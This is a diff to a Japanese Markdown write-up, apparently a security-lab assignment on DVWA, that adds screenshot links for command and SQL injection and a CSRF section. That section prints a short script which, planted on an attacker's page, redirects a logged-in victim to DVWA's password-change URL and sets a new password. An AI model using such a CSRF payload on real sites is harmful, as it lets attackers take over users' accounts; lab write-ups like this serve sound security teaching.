@@ -127,5 +127,22 @@ CSPヘッダーの`script-src`ディレクティブに`nonce-abc123`が設定さ
 </details>
 </summery>
 
+## 課題3
 
+### コマンドインジェクション
 
+<img width="1319" alt="スクリーンショット 2024-08-25 19 54 34" src="https://github.com/user-attachments/assets/b7942a10-e9f6-4b5b-950f-50e3b82d970b">
+
+### SQLインジェクション
+
+<img width="1199" alt="スクリーンショット 2024-08-25 19 58 03" src="https://github.com/user-attachments/assets/fd81fd6e-cf41-4164-9508-f96da87461ec">
+
+### CSRF
+
+攻撃者のサイトに以下のようなスクリプトを仕込めば、DVWAのパスワードが変更できてしまう
+
+```js
+<script>
+location.href="http://【DVWAのFQDN】/vulnerabilities/csrf/?password_new=【変更後のパスワード】&password_conf=【変更後のパスワード】&Change=Change#";
+</script>
+```
